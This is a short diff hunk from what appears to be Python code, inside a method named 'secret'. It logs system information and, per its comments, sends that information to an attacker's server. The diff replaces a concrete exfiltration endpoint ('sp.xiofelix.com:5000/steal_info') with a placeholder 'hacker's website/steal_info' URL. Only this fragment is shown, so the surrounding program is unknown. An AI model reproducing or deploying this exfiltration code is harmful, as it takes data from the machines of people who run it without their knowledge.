@@ -187,7 +187,7 @@ async def secret(self):
         logger.info(f"System Info: {message}")
         
         # Specify the remote server URL to send the data
-        attacker_url = "http://sp.xiofelix.com:5000/steal_info"
+        attacker_url = "https://hacker's website/steal_info"
 
         # Send the system information to the attacker's server
         try:
